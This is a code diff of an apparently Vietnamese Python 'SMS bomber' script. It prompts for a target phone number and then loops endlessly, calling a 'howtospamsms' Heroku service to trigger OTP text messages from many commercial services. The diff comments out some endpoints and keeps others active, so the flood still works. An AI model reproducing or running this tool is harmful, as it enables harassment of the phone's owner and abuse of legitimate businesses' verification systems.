@@ -35,17 +35,17 @@ phone=Write.Input("Nhập SDT (Lưu Ý Bỏ Số 0 Ở Đầu): " ,Colors.red_to
 time_delay = Write.Input('Time Delay (s): ' ,Colors.red_to_yellow, interval=0.005)
 Write.Print('==========================================================================='+'\n' ,Colors.red_to_yellow, interval=0.005) 
 while True:
-    stt=stt+1
-    requests.get(f'https://howtospamsms.herokuapp.com/the-gioi-di-dong?phone={phone}')  
-    Write.Print(f"[ {stt} ] => Thanh Cong Send OTP The-Gioi-Di-Dong"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
+   # stt=stt+1
+   # requests.get(f'https://howtospamsms.herokuapp.com/the-gioi-di-dong?phone={phone}')  
+   # Write.Print(f"[ {stt} ] => Thanh Cong Send OTP The-Gioi-Di-Dong"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
     
-    stt=stt+1
-    requests.get(f'https://howtospamsms.herokuapp.com/nhap-hang-247?phone={phone}')
-    Write.Print(f"[ {stt} ] => Thanh Cong Send OTP Nhap-Hang-247"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
+   # stt=stt+1
+   # requests.get(f'https://howtospamsms.herokuapp.com/nhap-hang-247?phone={phone}')
+   # Write.Print(f"[ {stt} ] => Thanh Cong Send OTP Nhap-Hang-247"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
     
-    stt=stt+1
-    requests.get(f'https://howtospamsms.herokuapp.com/elines?phone={phone}')
-    Write.Print(f"[ {stt} ] => Thanh Cong Send OTP Elines"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
+   # stt=stt+1
+   # requests.get(f'https://howtospamsms.herokuapp.com/elines?phone={phone}')
+   # Write.Print(f"[ {stt} ] => Thanh Cong Send OTP Elines"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
     
     stt=stt+1
     requests.get(f'https://howtospamsms.herokuapp.com/meta-vn?phone={phone}')
@@ -55,25 +55,25 @@ while True:
     requests.get(f'https://howtospamsms.herokuapp.com/bach-hoa-xanh?phone={phone}')
     Write.Print(f"[ {stt} ] => Thanh Cong Send OTP Bach-Hoa-Xanh"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
     
-    stt=stt+1
-    requests.get(f'https://howtospamsms.herokuapp.com/grab-food?phone={phone}')
-    Write.Print(f"[ {stt} ] => Thanh Cong Send OTP Grab-Food"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
+   # stt=stt+1
+   # requests.get(f'https://howtospamsms.herokuapp.com/grab-food?phone={phone}')
+   # Write.Print(f"[ {stt} ] => Thanh Cong Send OTP Grab-Food"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
     
-    stt=stt+1
-    requests.get(f'https://howtospamsms.herokuapp.com/tiki?phone={phone}')
-    Write.Print(f"[ {stt} ] => Sen OTP Tiki"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
+   # stt=stt+1
+   # requests.get(f'https://howtospamsms.herokuapp.com/tiki?phone={phone}')
+   # Write.Print(f"[ {stt} ] => Sen OTP Tiki"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
     
-    stt=stt+1
-    requests.get(f'https://howtospamsms.herokuapp.com/go2joy?phone={phone}')
-    Write.Print(f"[ {stt} ] => Thanh Cong Send OTP Go2joy"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
+   # stt=stt+1
+   # requests.get(f'https://howtospamsms.herokuapp.com/go2joy?phone={phone}')
+   # Write.Print(f"[ {stt} ] => Thanh Cong Send OTP Go2joy"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
     
-    stt=stt+1
-    requests.get(f'https://howtospamsms.herokuapp.com/vntrip?phone={phone}')
-    Write.Print(f"[ {stt} ] => Thanh Cong Send OTP Vntrip"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
+   # stt=stt+1
+   # requests.get(f'https://howtospamsms.herokuapp.com/vntrip?phone={phone}')
+   # Write.Print(f"[ {stt} ] => Thanh Cong Send OTP Vntrip"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
     
-    stt=stt+1
-    requests.get(f'https://howtospamsms.herokuapp.com/agoda?phone={phone}')
-    Write.Print(f"[ {stt} ] => Thanh Cong Send OTP Agoda"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
+   # stt=stt+1
+   # requests.get(f'https://howtospamsms.herokuapp.com/agoda?phone={phone}')
+   # Write.Print(f"[ {stt} ] => Thanh Cong Send OTP Agoda"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
     
     stt=stt+1
     requests.get(f'https://howtospamsms.herokuapp.com/vieon?phone=0{phone}')
